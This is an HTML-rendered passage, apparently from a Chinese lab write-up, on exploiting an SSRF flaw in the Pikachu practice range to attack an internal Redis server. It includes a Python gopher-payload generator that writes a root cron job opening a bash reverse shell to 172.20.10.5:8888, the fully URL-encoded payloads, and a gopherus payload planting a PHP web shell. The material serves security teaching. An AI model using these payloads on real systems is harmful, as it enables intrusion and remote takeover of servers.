style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> |</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> grep</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> redis</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    #ip为*才对</span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#检查防火墙</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">systemctl</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> disable</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> firewalld</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">cd</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> src</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">redis</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">server</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+A+'" alt="image" loading="lazy">​</p><p>​<img src="'+y+'" alt="image" loading="lazy">​</p><h2 id="使用centos7-redis" tabindex="-1"><a class="header-anchor" href="#使用centos7-redis"><span>使用centos7-redis</span></a></h2><ol><li><p>虚拟机启动CentOS7x64.ovf</p></li><li><p>arp-scan -l 发现ip</p></li><li><p>连接</p><p>​<img src="'+B+'" alt="image" loading="lazy">​</p></li></ol><p>1、熟悉Xml语句怎么构造，如何使用协议利用XXE漏洞。</p><p>‍</p><h4 id="皮卡丘靶场ssrf靶场用gopherus直接打redis" tabindex="-1"><a class="header-anchor" href="#皮卡丘靶场ssrf靶场用gopherus直接打redis"><span><span data-type="text" style="color:var(--b3-font-color9);">皮卡丘靶场SSRF靶场用gopherus直接打redis</span></span></a></h4><h3 id="实验环境" tabindex="-1"><a class="header-anchor" href="#实验环境"><span>实验环境</span></a></h3><ol><li>攻击者主机 ip：172.20.10.2</li><li>内网有SSRF漏洞的主机（pikachu主机） ip：172.20.10.3</li><li>内网Redis服务器（kali/centos7-redis） ip：172.20.10.4</li></ol><p>​<img src="'+c+'" alt="image" loading="lazy">​</p><h3 id="实验步骤" tabindex="-1"><a class="header-anchor" href="#实验步骤"><span>实验步骤</span></a></h3><ol><li><p>拼接www.baidu.com发现其可以正常访问百度，所以怀疑此处出现SSRF漏洞​<img src="'+o+'" alt="image" loading="lazy">​</p></li><li><p>dict协议又称在线网络字典协议。通过 dict协议，可以远程访问一个指定的 TCP 端口，并且会返回端口所提供的服务的部分组件信息当目标端口开放（有服务信息显示，但会报错）可以看出目标主机的<code>6379</code>​端口是开放的。</p><p>​<img src="'+m+'" alt="image" loading="lazy">​</p></li><li><p>由于对端是<code>6379</code>​端口也就是<code>redis</code>​服务的端口，向该端口传输的数据必须是<code>redis</code>​规定的格式，需要查找<code>redis</code>​报文格式的文档构造其报文，但那样过于繁琐，所以直接在本地另外一台服务器上搭建<code>redis</code>​服务，通过在本地连接这台<code>redis</code>​服务器，并向其发送攻击时所要发送的<code>redis</code>​命令从而获取其流量报文，最终再配合<code>Gopher</code>​协议完成传输即可。</p></li><li><p>使用python构建paylod，需要再URL编码一次</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> urllib.parse</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">protocol </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;gopher://&quot;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">ip </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;172.20.10.4&quot;</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">   #redis ip</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">port </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;6379&quot;</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">   #redis port</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">reverse_ip </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;172.20.10.5&quot;</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">   #反弹的主机</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">reverse_port </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;8888&quot;</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">   #监听的端口</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">cron </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\n\\n\\n\\n</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">*/1 * * * * bash -i &gt;&amp; /dev/tcp/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">{}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">{}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 0&gt;&amp;1</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\n\\n\\n\\n</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">format</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(reverse_ip, reverse_port)</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">filename </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;root&quot;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">path </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;/var/spool/cron&quot;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">passwd </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;&quot;</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">cmd </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [</span></span>\n<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;flushall&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>\n<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;set 1 </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">{}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">format</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(cron.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">replace</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot; &quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;$</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">{IFS}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)),</span></span>\n<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;config set dir </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">{}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">format</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(path),</span></span>\n<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;config set dbfilename </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">{}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">format</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(filename),</span></span>\n<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">    &quot;save&quot;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> passwd:</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    cmd.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">insert</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;AUTH </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">{}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">format</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(passwd))</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">payload </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> protocol </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">+</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ip </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">+</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;:&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> port </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">+</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;/_&quot;</span></span>\n<span class="line"></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> redis_format</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;">arr</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">):</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">    CRLF</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\r\\n</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    redis_arr </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> arr.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">split</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot; &quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    cmd </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;&quot;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    cmd </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">+=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;*&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">len</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(redis_arr))</span></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> x </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">in</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> redis_arr:</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        cmd </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">+=</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;"> CRLF</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;$&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> str</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">len</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(x.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">replace</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;$</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">{IFS}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot; &quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">))) </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">+</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;"> CRLF</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> x.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">replace</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;$</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">{IFS}</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot; &quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    cmd </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">+=</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;"> CRLF</span></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    return</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> cmd</span></span>\n<span class="line"></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;__main__&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> x </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">in</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> cmd:</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        payload </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">+=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> urllib.parse.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">quote</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">redis_format</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(x))</span></span>\n<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">    print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(payload)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>gopher://172.20.10.4:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2461%0D%0A%0A%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20/dev/tcp/172.20.10.5/8888%200%3E%261%0A%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2415%0D%0A/var/spool/cron%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span></span>\n<span class="line"><span>gopher%3a%2f%2f172.20.10.4%3a6379%2f_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252461%250D%250A%250A%250A%250A%250A%252A%2f1%2520%252A%2520%252A%2520%252A%2520%252A%2520bash%2520-i%2520%253E%2526%2520%2fdev%2ftcp%2f172.20.10.5%2f8888%25200%253E%25261%250A%250A%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252415%250D%250A%2fvar%2fspool%2fcron%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25244%250D%250Aroot%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>主机监听172.20.10.5</p><p>​<img src="'+u+'" alt="image" loading="lazy">​</p></li><li><p>拿到了shell，另一种方法是通过gopher直接写shell到redis的web目录，<span data-type="text" style="color:var(--b3-font-color9);">前提是redis主机有web服务</span>。</p><p>​<img src="'+v+'" alt="image" title="web服务是有的。" loading="lazy">​</p></li><li><p>根据前面主机监听修改redis服务器密码，方便查看shell有没有上传成功。</p><p>​<img src="'+C+'" alt="image" loading="lazy">​</p></li><li><p>使用gopherus.py工具生成gopher的payload。</p><p>​<img src="'+b+'" alt="image" loading="lazy">​</p></li><li><p>拿着上方payload进行二次URL编码</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">gopher</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">3a</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">2f</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">2f172</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.20.10.4</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">3a6379</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">2f_</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">252A1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">25248</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250Aflushall</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">252A3</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">25243</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250Aset</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">25241</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">252421</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">253C</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">253F</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">253D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">2560</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">2524_GET</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">255Bcmd</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">255D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">2560</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">253F</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">253E</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250D</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">250A</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span 